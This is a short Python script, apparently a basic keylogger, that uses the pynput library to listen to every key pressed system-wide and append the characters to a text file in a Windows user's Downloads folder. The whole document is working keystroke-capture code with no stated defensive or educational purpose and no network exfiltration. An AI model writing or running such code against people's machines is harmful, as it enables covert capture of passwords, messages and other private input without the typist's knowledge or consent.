





















































































from pynput import keyboard

def key_pressed(key):
    with open(r"C:\Users\user\Downloads\New Text Document.txt", 'a') as log_key:
        try:
            char = key.char
            log_key.write(char)
        except AttributeError:
            # Special key (e.g., shift, ctrl, etc.)
            log_key.write(f"[{key}]")

def main():
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()

if __name__ == "__main__":
    main()
